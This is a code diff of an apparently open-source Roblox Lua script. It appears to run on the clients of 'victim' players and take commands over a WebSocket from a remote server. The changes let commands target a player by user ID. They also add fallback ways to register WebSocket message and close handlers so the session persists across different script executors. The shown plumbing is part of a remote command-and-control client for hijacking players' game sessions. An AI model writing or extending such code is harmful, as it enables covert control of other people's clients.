@@ -1,13 +1,4 @@
 -- -Broma
-
--- OPEN SOURCE 
-
--- OPEN SOURCE
-
--- OPEN SOURCE 
-
-BY Darling 
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
@@ -70,7 +61,8 @@ local function handleCommand(data, ws)
         local t = string.lower(string.gsub(tostring(data.target), "%s+", ""))
         local myN = string.lower(string.gsub(tostring(LocalPlayer.Name or ""), "%s+", ""))
         local myD = string.lower(string.gsub(tostring(LocalPlayer.DisplayName or ""), "%s+", ""))
-        if t ~= myN and t ~= myD and not string.find(myN, t, 1, true) and not string.find(t, myN, 1, true) then
+        local myId = tostring(LocalPlayer.UserId or "")
+        if t ~= myN and t ~= myD and t ~= myId and not string.find(myN, t, 1, true) and not string.find(t, myN, 1, true) then
             return
         end
     end
@@ -398,13 +390,18 @@ task.spawn(function()
             end
 
             pcall(function() ws.OnMessage:Connect(onMsg) end)
+            pcall(function() ws.OnMessage:connect(onMsg) end)
+            pcall(function() ws.onmessage = onMsg end)
+            pcall(function() ws.OnMessage = onMsg end)
 
             local isClosed = false
-            pcall(function()
-                ws.OnClose:Connect(function()
-                    isClosed = true
-                end)
-            end)
+            local function onCloseHandler()
+                isClosed = true
+            end
+            pcall(function() ws.OnClose:Connect(onCloseHandler) end)
+            pcall(function() ws.OnClose:connect(onCloseHandler) end)
+            pcall(function() ws.onclose = onCloseHandler end)
+            pcall(function() ws.OnClose = onCloseHandler end)
 
             while not isClosed and _G.SacredVictimWS == ws and _G.SacredVictimSessionId == mySessionId do
                 task.wait(10)
